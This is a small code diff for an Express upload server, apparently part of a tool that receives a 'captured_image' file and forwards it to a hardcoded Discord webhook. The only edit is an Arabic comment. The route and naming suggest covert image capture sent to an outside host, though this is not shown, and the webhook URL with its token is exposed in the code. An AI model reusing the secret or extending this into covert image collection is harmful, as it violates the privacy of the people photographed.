@@ -10,7 +10,7 @@ app.use(cors());
 
 const upload = multer({ dest: 'uploads/' });
 
-// ضع رابط الـ Webhook الخاص بك هنا بين العلامتين ''
+// رابط الـ Webhook الخاص بك جاهز وصحيح هنا
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525465698317373540/iGdJxuIPPgFXaxss4xXOlJuEnsvZ1cR5ZG';
 
 app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
